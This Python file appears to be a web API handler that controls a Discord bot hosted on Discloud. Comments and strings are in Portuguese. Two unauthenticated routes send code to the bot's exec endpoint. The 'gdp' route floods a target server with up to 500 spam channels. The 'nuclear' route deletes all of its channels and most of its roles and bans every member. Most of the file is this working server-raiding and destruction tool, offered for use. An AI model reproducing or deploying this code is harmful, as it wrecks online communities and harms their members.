from http.server import BaseHTTPRequestHandler
import json
import os
import requests
import time

DISCLOUD_TOKEN = os.getenv('DISCLOUD_TOKEN', '')
BOT_ID = os.getenv('BOT_ID', '1386082293533249546')
API_BASE = "https://api.discloud.app/v2"

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
        
        path = self.path
        
        # Rotas
        if path == '/api/test':
            result = {"status": "online", "msg": "API funcionando"}
        
        elif path == '/api/status':
            result = self.get_status()
        
        elif path == '/api/servidores':
            result = self.get_servidores()
        
        elif path.startswith('/api/gdp/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                qtd = partes[4] if len(partes) >= 5 else '100'
                result = self.executar_gdp(server_id, qtd)
            else:
                result = {"erro": "URL inválida"}
        
        elif path.startswith('/api/nuclear/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                result = self.executar_nuclear(server_id)
            else:
                result = {"erro": "URL inválida"}
        
        else:
            result = {
                "rotas": [
                    "/api/test",
                    "/api/status",
                    "/api/servidores",
                    "/api/gdp/ID/QUANTIDADE",
                    "/api/nuclear/ID"
                ]
            }
        
        self.wfile.write(json.dumps(result).encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
    
    def _api_call(self, method, endpoint, data=None):
        """Chamada para API da Discloud"""
        headers = {'api-token': DISCLOUD_TOKEN}
        url = f"{API_BASE}{endpoint}"
        
        try:
            if method == 'GET':
                r = requests.get(url, headers=headers, timeout=10)
            else:
                r = requests.post(url, headers=headers, json=data, timeout=10)
            
            if r.status_code == 200:
                return r.json()
            return {"erro": f"HTTP {r.status_code}"}
        except:
            return {"erro": "Falha na conexão"}
    
    def get_status(self):
        """Status do bot"""
        return self._api_call('GET', f"/app/{BOT_ID}/status")
    
    def get_servidores(self):
        """Lista servidores"""
        data = self._api_call('GET', f"/app/{BOT_ID}")
        if 'guilds' in str(data):
            return {"servidores": data.get('guilds', [])}
        return {"servidores": []}
    
    def executar_gdp(self, server_id, quantidade):
        """Executa GDP"""
        try:
            qtd = min(int(quantidade), 500)
        except:
            qtd = 100
        
        # Código Python para executar no bot
        codigo = f"""
import asyncio
guild = bot.get_guild({server_id})
if guild:
    criados = 0
    for i in range(1, {qtd} + 1):
        try:
            await guild.create_text_channel(f"G.D.P-{{i:03d}}")
            criados += 1
            await asyncio.sleep(0.5)
        except:
            pass
    print(f"✅ {{criados}} canais criados")
"""
        
        result = self._api_call('POST', f"/app/{BOT_ID}/exec", {"code": codigo})
        
        if 'erro' not in result:
            return {"sucesso": True, "msg": f"Criando {qtd} canais..."}
        return {"erro": "Falha ao executar"}
    
    def executar_nuclear(self, server_id):
        """Executa Nuclear"""
        codigo = f"""
import asyncio
guild = bot.get_guild({server_id})
if guild:
    # Deletar canais
    for c in guild.channels:
        try:
            await c.delete()
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Deletar cargos
    for r in guild.roles:
        if r.name != "@everyone" and not r.managed:
            try:
                await r.delete()
                await asyncio.sleep(0.3)
            except:
                pass
    
    # Banir membros
    for m in guild.members:
        if m != guild.me:
            try:
                await m.ban(reason="Nuclear")
                await asyncio.sleep(1)
            except:
                pass
    
    print("☢️ Nuclear concluído")
"""
        
        result = self._api_call('POST', f"/app/{BOT_ID}/exec", {"code": codigo})
        
        if 'erro' not in result:
            return {"sucesso": True, "msg": "☢️ Limpeza nuclear iniciada"}
        return {"erro": "Falha ao executar"}